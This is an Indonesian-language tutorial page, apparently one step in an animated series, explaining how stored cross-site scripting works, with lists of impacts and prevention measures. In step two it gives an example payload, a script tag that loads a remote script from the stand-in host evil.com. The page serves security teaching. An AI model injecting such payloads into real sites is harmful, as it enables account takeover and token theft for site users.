💾 STORED CROSS-SITE SCRIPTING

Cara Kerja Stored XSS

Script tersimpan permanen di database server dan akan menyerang SEMUA user yang melihat halaman tersebut.

← Reflected XSS🏠 Semua AnimasiDOM XSS →
1
📝 Attacker menemukan form input (misal komentar)
Kolom komentar, profil user, forum - fitur yang menyimpan input text ke database.
2
💉 Attacker mensubmit payload
Mengirimkan: <script src="http://evil.com/xss.js"></script> sebagai komentar.
3
💾 Payload tersimpan di Database
Server menyimpan script jahat ini secara permanen ke dalam database tanpa sanitasi.
4
👤 Korban mengunjungi halaman
Korban (atau bahkan Admin) membuka halaman komentar tersebut.
5
💥 Script tereksekusi otomatis
Browser korban mengunduh dan mengeksekusi xss.js, yang bisa langsung mengubah password atau mencuri token.

💀 Dampak

  • Mass account takeover
  • Penyebaran worm (seperti Samy Worm)
  • Defacement permanen
  • Aksi massal tanpa izin

🛡️ Pencegahan

  • Output Encoding (mutlak!)
  • Sanitasi input (HTML Purifier)
  • CSP
  • WAF (Web Application Firewall)
